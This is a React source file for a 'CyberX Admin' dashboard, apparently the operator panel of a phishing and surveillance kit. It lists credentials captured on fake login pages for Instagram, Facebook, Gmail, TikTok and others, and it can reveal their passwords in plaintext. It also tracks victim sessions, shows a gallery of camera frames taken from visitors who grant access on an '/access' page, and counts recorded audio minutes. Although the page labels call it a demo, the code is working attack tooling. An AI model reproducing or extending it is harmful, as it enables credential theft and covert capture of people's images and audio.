import { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  Activity,
  BarChart3,
  Camera,
  Clock3,
  Eye,
  EyeOff,
  ImageOff,
  KeyRound,
  LogOut,
  RefreshCw,
  Shield,
  Trash2,
  Users,
  X,
} from 'lucide-react';
import { getApiUrl } from '../../api';

type AdminPhoto = {
  id: string;
  session_id: string;
  storage_key: string | null;
  metadata: string | null;
  capture_timestamp: string;
};

const TABS = [
  { id: 'credentials', label: 'Credentials', icon: KeyRound },
  { id: 'sessions', label: 'Sessions', icon: Users },
  { id: 'photos', label: 'Photos', icon: Camera },
  { id: 'analytics', label: 'Analytics', icon: BarChart3 },
] as const;

type PhotoSort = 'newest' | 'oldest' | 'session' | 'source';

const PLATFORM_STYLES: Record<string, string> = {
  instagram: 'bg-pink-50 text-pink-700 ring-pink-200',
  facebook: 'bg-blue-50 text-blue-700 ring-blue-200',
  twitter: 'bg-sky-50 text-sky-700 ring-sky-200',
  linkedin: 'bg-cyan-50 text-cyan-700 ring-cyan-200',
  gmail: 'bg-red-50 text-red-700 ring-red-200',
  tiktok: 'bg-fuchsia-50 text-fuchsia-700 ring-fuchsia-200',
  access: 'bg-emerald-50 text-emerald-700 ring-emerald-200',
  camera: 'bg-emerald-50 text-emerald-700 ring-emerald-200',
};

function parsePhotoMetadata(metadata: string | null) {
  try {
    return metadata ? JSON.parse(metadata) : {};
  } catch {
    return {};
  }
}

function formatTime(value?: string) {
  if (!value) {
    return 'Unknown';
  }
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) {
    return value;
  }
  return date.toLocaleString();
}

function PhotoThumbnail({ photoId, token, alt }: { photoId: string; token: string; alt: string }) {
  const [src, setSrc] = useState<string | null>(null);
  const [failed, setFailed] = useState(false);

  useEffect(() => {
    let objectUrl: string | null = null;
    let cancelled = false;

    const load = async () => {
      try {
        const response = await fetch(getApiUrl(`/api/admin/photos/${photoId}/image`), {
          headers: { Authorization: `Bearer ${token}` },
        });
        if (!response.ok) {
          throw new Error('Failed to load photo');
        }
        const blob = await response.blob();
        if (cancelled) {
          return;
        }
        objectUrl = URL.createObjectURL(blob);
        setSrc(objectUrl);
      } catch {
        if (!cancelled) {
          setFailed(true);
        }
      }
    };

    void load();

    return () => {
      cancelled = true;
      if (objectUrl) {
        URL.revokeObjectURL(objectUrl);
      }
    };
  }, [photoId, token]);

  if (failed) {
    return (
      <div className="flex h-full w-full flex-col items-center justify-center gap-2 bg-gray-100 text-gray-400">
        <ImageOff size={22} />
        <span className="text-xs">Unavailable</span>
      </div>
    );
  }

  if (!src) {
    return <div className="h-full w-full animate-pulse bg-gray-100" />;
  }

  return <img src={src} alt={alt} className="h-full w-full object-cover" />;
}

export default function AdminDashboard() {
  const navigate = useNavigate();
  const [credentials, setCredentials] = useState<any[]>([]);
  const [sessions, setSessions] = useState<any[]>([]);
  const [photos, setPhotos] = useState<AdminPhoto[]>([]);
  const [analytics, setAnalytics] = useState<any>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [activeTab, setActiveTab] = useState<(typeof TABS)[number]['id']>('credentials');
  const [deleteConfirm, setDeleteConfirm] = useState(false);
  const [revealedPasswords, setRevealedPasswords] = useState<Record<string, boolean>>({});
  const [selectedPhoto, setSelectedPhoto] = useState<AdminPhoto | null>(null);
  const [sessionFilter, setSessionFilter] = useState('all');
  const [photoSort, setPhotoSort] = useState<PhotoSort>('newest');
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const adminToken = localStorage.getItem('adminToken') || '';

  useEffect(() => {
    const token = localStorage.getItem('adminToken');
    if (!token) {
      navigate('/admin/login');
      return;
    }
    void loadData();
    const interval = setInterval(() => {
      void loadData(true);
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  const loadData = async (silent = false) => {
    const token = localStorage.getItem('adminToken');
    if (!silent) {
      setIsRefreshing(true);
    }

    try {
      const [credResponse, sessResponse, photosResponse, analyticsResponse] = await Promise.all([
        fetch(getApiUrl('/api/admin/credentials'), { headers: { Authorization: `Bearer ${token}` } }),
        fetch(getApiUrl('/api/admin/sessions'), { headers: { Authorization: `Bearer ${token}` } }),
        fetch(getApiUrl('/api/admin/photos'), { headers: { Authorization: `Bearer ${token}` } }),
        fetch(getApiUrl('/api/admin/analytics'), { headers: { Authorization: `Bearer ${token}` } }),
      ]);

      if (credResponse.ok) {
        setCredentials(await credResponse.json());
      }
      if (sessResponse.ok) {
        setSessions(await sessResponse.json());
      }
      if (photosResponse.ok) {
        const photosData = await photosResponse.json();
        setPhotos(Array.isArray(photosData) ? photosData : []);
      }
      if (analyticsResponse.ok) {
        setAnalytics(await analyticsResponse.json());
      }
      setLastUpdated(new Date());
    } catch (error) {
      console.error('Failed to load data:', error);
    } finally {
      setIsLoading(false);
      setIsRefreshing(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    navigate('/admin/login');
  };

  const handleDeleteAllData = async () => {
    if (!deleteConfirm) {
      setDeleteConfirm(true);
      return;
    }

    const token = localStorage.getItem('adminToken');
    try {
      const response = await fetch(getApiUrl('/api/admin/all-data'), {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${token}` },
      });

      if (response.ok) {
        setCredentials([]);
        setSessions([]);
        setPhotos([]);
        setAnalytics(null);
        setSelectedPhoto(null);
        setDeleteConfirm(false);
      }
    } catch (error) {
      console.error('Delete failed:', error);
    }
  };

  const togglePasswordVisibility = (credentialId: string) => {
    setRevealedPasswords((prev) => ({
      ...prev,
      [credentialId]: !prev[credentialId],
    }));
  };

  const sessionIds = useMemo(
    () => Array.from(new Set(photos.map((photo) => photo.session_id).filter(Boolean))),
    [photos]
  );

  const visiblePhotos = useMemo(() => {
    const filtered =
      sessionFilter === 'all' ? [...photos] : photos.filter((photo) => photo.session_id === sessionFilter);

    const timeValue = (photo: AdminPhoto) => new Date(photo.capture_timestamp).getTime() || 0;
    const sourceValue = (photo: AdminPhoto) =>
      String(parsePhotoMetadata(photo.metadata).source || 'camera').toLowerCase();

    filtered.sort((a, b) => {
      if (photoSort === 'oldest') {
        return timeValue(a) - timeValue(b);
      }
      if (photoSort === 'session') {
        return a.session_id.localeCompare(b.session_id) || timeValue(b) - timeValue(a);
      }
      if (photoSort === 'source') {
        return sourceValue(a).localeCompare(sourceValue(b)) || timeValue(b) - timeValue(a);
      }
      return timeValue(b) - timeValue(a);
    });

    return filtered;
  }, [photos, sessionFilter, photoSort]);

  useEffect(() => {
    if (!selectedPhoto) {
      return;
    }

    const onKeyDown = (event: KeyboardEvent) => {
      if (event.key === 'Escape') {
        setSelectedPhoto(null);
        return;
      }

      const currentIndex = visiblePhotos.findIndex((photo) => photo.id === selectedPhoto.id);
      if (event.key === 'ArrowRight' && currentIndex < visiblePhotos.length - 1) {
        setSelectedPhoto(visiblePhotos[currentIndex + 1]);
      }
      if (event.key === 'ArrowLeft' && currentIndex > 0) {
        setSelectedPhoto(visiblePhotos[currentIndex - 1]);
      }
    };

    window.addEventListener('keydown', onKeyDown);
    return () => window.removeEventListener('keydown', onKeyDown);
  }, [selectedPhoto, visiblePhotos]);

  const platformCounts = analytics?.credentialsByPlatform || {};
  const maxPlatformCount = Math.max(1, ...Object.values(platformCounts).map((count) => Number(count) || 0));

  if (isLoading && !credentials.length && !photos.length) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-linear-to-br from-purple-50 to-blue-50 text-gray-600">
        <div className="text-center">
          <div className="mx-auto mb-4 h-10 w-10 animate-spin rounded-full border-2 border-purple-500 border-t-transparent" />
          <p>Loading dashboard...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-linear-to-br from-purple-50 to-blue-50 text-gray-800">
      <header className="sticky top-0 z-40 border-b border-purple-100 bg-white/90 backdrop-blur">
        <div className="mx-auto flex max-w-7xl items-center justify-between gap-4 px-4 py-4">
          <div className="flex items-center gap-3">
            <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-purple-100 text-purple-700">
              <Shield size={22} />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-xl font-semibold tracking-tight text-gray-900">CyberX Admin</h1>
                <span className="inline-flex items-center gap-1 rounded-full bg-green-50 px-2 py-0.5 text-[11px] font-medium text-green-700 ring-1 ring-green-200">
                  <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-green-500" />
                  Live
                </span>
              </div>
              <p className="text-xs text-gray-500">
                {lastUpdated ? `Updated ${lastUpdated.toLocaleTimeString()}` : 'Waiting for first refresh'}
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => void loadData()}
              className="inline-flex items-center gap-2 rounded-lg bg-blue-600 px-3 py-2 text-sm text-white transition hover:bg-blue-700"
            >
              <RefreshCw size={16} className={isRefreshing ? 'animate-spin' : ''} />
              Refresh
            </button>
            <button
              onClick={handleLogout}
              className="inline-flex items-center gap-2 rounded-lg bg-gray-700 px-3 py-2 text-sm text-white transition hover:bg-gray-800"
            >
              <LogOut size={16} />
              Logout
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-7xl px-4 py-8">
        <section className="mb-8 grid grid-cols-1 gap-4 sm:grid-cols-2 xl:grid-cols-4">
          {[
            { label: 'Active Sessions', value: analytics?.activeSessions || sessions.length || 0, icon: Activity, tone: 'text-blue-600 bg-blue-50' },
            { label: 'Credentials', value: analytics?.totalCredentials || credentials.length || 0, icon: KeyRound, tone: 'text-red-600 bg-red-50' },
            { label: 'Photos', value: analytics?.totalPhotos || photos.length || 0, icon: Camera, tone: 'text-green-600 bg-green-50' },
            { label: 'Audio', value: `${analytics?.totalAudioMinutes || 0}m`, icon: Clock3, tone: 'text-purple-600 bg-purple-50' },
          ].map((card) => (
            <div key={card.label} className="rounded-2xl border border-purple-100 bg-white p-5 shadow-sm">
              <div className="flex items-center justify-between">
                <p className="text-sm text-gray-500">{card.label}</p>
                <div className={`rounded-lg p-2 ${card.tone}`}>
                  <card.icon size={18} />
                </div>
              </div>
              <p className="mt-4 text-3xl font-semibold tracking-tight text-gray-900">{card.value}</p>
            </div>
          ))}
        </section>

        <section className="overflow-hidden rounded-2xl border border-purple-100 bg-white shadow-sm">
          <div className="flex gap-1 overflow-x-auto border-b border-gray-100 p-2">
            {TABS.map((tab) => {
              const count =
                tab.id === 'credentials'
                  ? credentials.length
                  : tab.id === 'sessions'
                    ? sessions.length
                    : tab.id === 'photos'
                      ? photos.length
                      : Object.keys(platformCounts).length;
              const Icon = tab.icon;
              const isActive = activeTab === tab.id;

              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`inline-flex items-center gap-2 rounded-xl px-4 py-2.5 text-sm font-medium transition ${
                    isActive ? 'bg-purple-600 text-white' : 'text-gray-500 hover:bg-purple-50 hover:text-gray-900'
                  }`}
                >
                  <Icon size={16} />
                  {tab.label}
                  <span className={`rounded-full px-1.5 py-0.5 text-[11px] ${isActive ? 'bg-white/20' : 'bg-gray-100'}`}>
                    {count}
                  </span>
                </button>
              );
            })}
          </div>

          {activeTab === 'credentials' && (
            <div className="p-4 md:p-6">
              {credentials.length ? (
                <div className="overflow-x-auto">
                  <table className="w-full min-w-180 text-left text-sm">
                    <thead className="text-xs uppercase tracking-wide text-gray-500">
                      <tr>
                        <th className="px-3 py-3">Platform</th>
                        <th className="px-3 py-3">Email / Username</th>
                        <th className="px-3 py-3">Password</th>
                        <th className="px-3 py-3">Captured</th>
                        <th className="px-3 py-3">Session</th>
                      </tr>
                    </thead>
                    <tbody>
                      {credentials.map((cred, idx) => {
                        const isPasswordVisible = !!revealedPasswords[cred.id];
                        const passwordDisplay = isPasswordVisible
                          ? cred.password
                          : '•'.repeat(Math.min(String(cred.password || '').length, 12));
                        const platform = String(cred.demo_type || 'unknown').toLowerCase();

                        return (
                          <tr key={cred.id || idx} className="border-t border-gray-100 hover:bg-purple-50/60">
                            <td className="px-3 py-3">
                              <span className={`inline-flex rounded-full px-2.5 py-1 text-xs font-medium ring-1 ${PLATFORM_STYLES[platform] || 'bg-gray-100 text-gray-700 ring-gray-200'}`}>
                                {cred.demo_type || 'unknown'}
                              </span>
                            </td>
                            <td className="px-3 py-3 font-medium text-gray-900">{cred.email_or_username}</td>
                            <td className="px-3 py-3">
                              <div className="flex items-center gap-2">
                                <code className="rounded-md bg-gray-100 px-2 py-1 text-xs text-gray-800">{passwordDisplay}</code>
                                <button
                                  type="button"
                                  onClick={() => togglePasswordVisibility(cred.id)}
                                  className="rounded-md p-1.5 text-gray-500 transition hover:bg-gray-100 hover:text-gray-900"
                                  aria-label={isPasswordVisible ? 'Hide password' : 'Show password'}
                                >
                                  {isPasswordVisible ? <EyeOff size={16} /> : <Eye size={16} />}
                                </button>
                              </div>
                            </td>
                            <td className="px-3 py-3 text-xs text-gray-500">{formatTime(cred.captured_at)}</td>
                            <td className="px-3 py-3 font-mono text-xs text-gray-500">{cred.session_id?.slice(-8)}</td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              ) : (
                <EmptyState title="No credentials yet" body="Captured logins from the demo pages will appear here." />
              )}
            </div>
          )}

          {activeTab === 'sessions' && (
            <div className="grid gap-4 p-4 md:grid-cols-2 md:p-6">
              {sessions.length ? (
                sessions.map((session) => (
                  <div key={session.id} className="rounded-2xl border border-gray-100 bg-gray-50 p-4">
                    <div className="flex items-start justify-between gap-3">
                      <div>
                        <p className="font-mono text-sm text-gray-900">Session {session.id?.slice(-8)}</p>
                        <p className="mt-1 text-xs text-gray-500">{session.id}</p>
                      </div>
                      <span className={`rounded-full px-2.5 py-1 text-xs font-medium ring-1 ${
                        session.status === 'active'
                          ? 'bg-green-50 text-green-700 ring-green-200'
                          : 'bg-gray-100 text-gray-600 ring-gray-200'
                      }`}>
                        {session.status || 'unknown'}
                      </span>
                    </div>
                    <div className="mt-4 grid grid-cols-2 gap-3 text-sm">
                      <div className="rounded-xl bg-white px-3 py-2">
                        <p className="text-xs text-gray-500">Photos</p>
                        <p className="font-semibold text-gray-900">{session.photo_count || 0}</p>
                      </div>
                      <div className="rounded-xl bg-white px-3 py-2">
                        <p className="text-xs text-gray-500">Audio</p>
                        <p className="font-semibold text-gray-900">{session.audio_duration_ms || 0}ms</p>
                      </div>
                    </div>
                    <p className="mt-3 text-xs text-gray-500">{formatTime(session.created_at)}</p>
                  </div>
                ))
              ) : (
                <div className="md:col-span-2">
                  <EmptyState title="No sessions yet" body="A session is created when someone starts the access flow." />
                </div>
              )}
            </div>
          )}

          {activeTab === 'photos' && (
            <div className="p-4 md:p-6">
              {photos.length ? (
                <>
                  <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-end sm:justify-between">
                    <div className="flex flex-wrap gap-3">
                      <label className="flex min-w-48 flex-col gap-1 text-xs font-medium text-gray-500">
                        Filter by session
                        <select
                          value={sessionFilter}
                          onChange={(event) => setSessionFilter(event.target.value)}
                          className="rounded-lg border border-gray-200 bg-white px-3 py-2 text-sm text-gray-800"
                        >
                          <option value="all">All sessions ({photos.length})</option>
                          {sessionIds.map((sessionId) => (
                            <option key={sessionId} value={sessionId}>
                              {sessionId.slice(-8)} ({photos.filter((photo) => photo.session_id === sessionId).length})
                            </option>
                          ))}
                        </select>
                      </label>
                      <label className="flex min-w-48 flex-col gap-1 text-xs font-medium text-gray-500">
                        Sort photos
                        <select
                          value={photoSort}
                          onChange={(event) => setPhotoSort(event.target.value as PhotoSort)}
                          className="rounded-lg border border-gray-200 bg-white px-3 py-2 text-sm text-gray-800"
                        >
                          <option value="newest">Newest first</option>
                          <option value="oldest">Oldest first</option>
                          <option value="session">Session</option>
                          <option value="source">Source</option>
                        </select>
                      </label>
                    </div>
                    <p className="text-sm text-gray-500">{visiblePhotos.length} shown</p>
                  </div>

                  <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4">
                    {visiblePhotos.map((photo) => {
                      const metadata = parsePhotoMetadata(photo.metadata);
                      const source = metadata.source || 'camera';

                      return (
                        <button
                          key={photo.id}
                          type="button"
                          onClick={() => setSelectedPhoto(photo)}
                          className="group overflow-hidden rounded-2xl border border-gray-200 bg-white text-left shadow-sm transition hover:-translate-y-0.5 hover:border-purple-300 hover:shadow-md"
                        >
                          <div className="relative aspect-4/3 overflow-hidden">
                            <div className="h-full w-full transition duration-300 group-hover:scale-105">
                              <PhotoThumbnail
                                photoId={photo.id}
                                token={adminToken}
                                alt={`Capture from session ${photo.session_id}`}
                              />
                            </div>
                            <div className="absolute inset-x-0 bottom-0 bg-linear-to-t from-black/70 via-black/20 to-transparent p-3">
                              <p className="text-sm font-medium text-white capitalize">{source}</p>
                              <p className="text-[11px] text-white/80">
                                {photo.session_id?.slice(-8)} · {formatTime(photo.capture_timestamp)}
                              </p>
                            </div>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                </>
              ) : (
                <EmptyState title="No photos captured yet" body="Grant camera access on /access to start collecting frames." />
              )}
            </div>
          )}

          {activeTab === 'analytics' && (
            <div className="grid gap-6 p-4 md:grid-cols-2 md:p-6">
              <div className="rounded-2xl border border-gray-100 bg-gray-50 p-5">
                <h3 className="mb-4 text-sm font-semibold text-gray-900">Credentials by platform</h3>
                <div className="space-y-3">
                  {Object.keys(platformCounts).length ? (
                    Object.entries(platformCounts).map(([platform, count]) => (
                      <div key={platform}>
                        <div className="mb-1 flex items-center justify-between text-sm">
                          <span className="capitalize text-gray-600">{platform}</span>
                          <span className="font-semibold text-gray-900">{String(count)}</span>
                        </div>
                        <div className="h-2 overflow-hidden rounded-full bg-white">
                          <div
                            className="h-full rounded-full bg-purple-500"
                            style={{ width: `${(Number(count) / maxPlatformCount) * 100}%` }}
                          />
                        </div>
                      </div>
                    ))
                  ) : (
                    <p className="text-sm text-gray-500">No platform data yet.</p>
                  )}
                </div>
              </div>
              <div className="rounded-2xl border border-gray-100 bg-gray-50 p-5">
                <h3 className="mb-4 text-sm font-semibold text-gray-900">Session stats</h3>
                <div className="space-y-3 text-sm">
                  <div className="flex items-center justify-between rounded-xl bg-white px-3 py-3">
                    <span className="text-gray-500">Total sessions</span>
                    <span className="font-semibold text-gray-900">{sessions.length}</span>
                  </div>
                  <div className="flex items-center justify-between rounded-xl bg-white px-3 py-3">
                    <span className="text-gray-500">Photos / session</span>
                    <span className="font-semibold text-gray-900">
                      {sessions.length ? (photos.length / sessions.length).toFixed(1) : '0'}
                    </span>
                  </div>
                  <div className="flex items-center justify-between rounded-xl bg-white px-3 py-3">
                    <span className="text-gray-500">Credentials / session</span>
                    <span className="font-semibold text-gray-900">
                      {sessions.length ? (credentials.length / sessions.length).toFixed(1) : '0'}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </section>

        <section className="mt-6 rounded-2xl border border-red-200 bg-red-50 p-5">
          <h2 className="text-lg font-semibold text-gray-900">Data management</h2>
          <p className="mt-1 text-sm text-gray-600">
            This permanently deletes captured sessions, credentials, and photo records from the demo database.
          </p>
          <div className="mt-4 flex flex-wrap gap-3">
            <button
              onClick={() => void handleDeleteAllData()}
              className={`inline-flex items-center gap-2 rounded-lg px-4 py-2.5 text-sm font-medium text-white transition ${
                deleteConfirm ? 'bg-red-600 hover:bg-red-700' : 'bg-gray-700 hover:bg-gray-800'
              }`}
            >
              <Trash2 size={16} />
              {deleteConfirm ? 'Confirm delete all' : 'Delete all data'}
            </button>
            {deleteConfirm && (
              <button
                onClick={() => setDeleteConfirm(false)}
                className="rounded-lg bg-white px-4 py-2.5 text-sm text-gray-700 ring-1 ring-gray-200 hover:bg-gray-50"
              >
                Cancel
              </button>
            )}
          </div>
        </section>
      </main>

      {selectedPhoto && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4"
          onClick={() => setSelectedPhoto(null)}
        >
          <div
            className="relative w-full max-w-4xl overflow-hidden rounded-2xl bg-white shadow-2xl"
            onClick={(event) => event.stopPropagation()}
          >
            <button
              type="button"
              onClick={() => setSelectedPhoto(null)}
              className="absolute right-3 top-3 z-10 rounded-full bg-white p-2 text-gray-700 shadow hover:bg-gray-100"
              aria-label="Close photo"
            >
              <X size={18} />
            </button>
            <div className="aspect-16/10 bg-gray-100">
              <PhotoThumbnail
                photoId={selectedPhoto.id}
                token={adminToken}
                alt={`Full capture from session ${selectedPhoto.session_id}`}
              />
            </div>
            <div className="grid gap-3 p-4 text-sm text-gray-700 sm:grid-cols-3">
              <div className="rounded-xl bg-gray-50 px-3 py-2">
                <p className="text-[11px] uppercase tracking-wide text-gray-500">Session</p>
                <p className="truncate font-mono text-gray-900">{selectedPhoto.session_id}</p>
              </div>
              <div className="rounded-xl bg-gray-50 px-3 py-2">
                <p className="text-[11px] uppercase tracking-wide text-gray-500">Source</p>
                <p className="capitalize text-gray-900">{parsePhotoMetadata(selectedPhoto.metadata).source || 'camera'}</p>
              </div>
              <div className="rounded-xl bg-gray-50 px-3 py-2">
                <p className="text-[11px] uppercase tracking-wide text-gray-500">Captured</p>
                <p className="text-gray-900">{formatTime(selectedPhoto.capture_timestamp)}</p>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function EmptyState({ title, body }: { title: string; body: string }) {
  return (
    <div className="rounded-2xl border border-dashed border-gray-200 px-6 py-16 text-center">
      <p className="text-base font-medium text-gray-900">{title}</p>
      <p className="mt-1 text-sm text-gray-500">{body}</p>
    </div>
  );
}
